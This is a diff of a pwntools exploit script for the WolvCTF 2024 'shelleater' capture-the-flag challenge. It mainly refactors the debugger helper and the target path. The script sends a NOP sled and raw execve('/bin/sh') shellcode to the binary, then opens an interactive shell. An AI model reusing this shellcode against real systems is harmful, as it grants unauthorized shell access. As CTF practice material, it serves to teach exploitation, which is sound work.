@@ -11,21 +11,23 @@ context.update(
 )
 
 REMOTE = False
-TARGET = './shelleater'
+TARGET = os.path.realpath('/ctf-writeups/WolvCTF 2024/pwn/shelleater/shelleater')
 elf = ELF(TARGET)
 
 def attach(r):
-    if not REMOTE:
-        bkps = []
-        cmds = []
-        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
-    return
+    if REMOTE:
+        return
+
+    bkps = []
+    cmds = []
+
+    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
 
 def exploit(r):
     attach(r)
-    
+
     payload = b'\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'
-    
+
     r.sendlineafter(b'shell go here :)\n', b'\x90' * (0x64 - len(payload)) + payload)
     r.interactive()
     return
@@ -37,6 +39,6 @@ if __name__ == '__main__':
     else:
         REMOTE = False
         r = process([TARGET,])
-        
+
     exploit(r)
     exit(0)
